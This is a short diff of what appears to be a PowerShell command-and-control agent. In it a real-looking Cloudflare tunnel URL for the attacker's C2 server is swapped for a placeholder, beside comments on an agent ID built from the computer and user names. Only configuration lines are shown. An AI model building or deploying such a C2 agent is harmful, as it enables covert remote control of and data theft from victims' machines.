@@ -22,7 +22,7 @@
 
 # C2 Server URL - FastAPI server running on attacker machine
 # Change this to your server's IP address
- $ServerUrl = "https://attention-launches-kind-commonly.trycloudflare.com/bits"
+ $ServerUrl = "https://CHANGE-MECHANGE-ME.trycloudflare.com/bits"
 
 # Unique Agent Identifier
 # Format: COMPUTERNAME_USERNAME
